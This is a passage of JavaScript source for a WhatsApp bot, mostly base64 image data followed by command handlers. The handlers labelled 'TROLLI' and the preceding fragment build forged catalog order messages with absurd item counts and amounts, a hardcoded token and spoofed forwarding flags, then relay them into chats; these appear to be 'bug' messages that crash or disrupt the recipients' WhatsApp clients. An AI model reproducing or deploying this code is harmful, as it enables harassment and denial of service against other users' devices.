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",
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "GUA GK NGERTI",
"message":"entah lah gua nob",
"sellerJid": "6288224859350@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
dha.relayWAMessage(res)
await limitAdd(sender)
break  
case 'p': // TROLLI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
buf = Mfake
imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await dha.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "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",
"itemCount": 2021,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "LOL",
"message":"Hallo Kak",
"sellerJid": "6288224859350@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}}) 

dha.relayWAMessage(res)
await limitAdd(sender)
break     
//------------------<HEWAN MENU>---------------
                    
//------------------< Ingfo Bot >-------------------
      case 'runtime':
              textImg(`${runtime(process.uptime())}`)
              await limitAdd(sender)
break
       case 'youtube': 
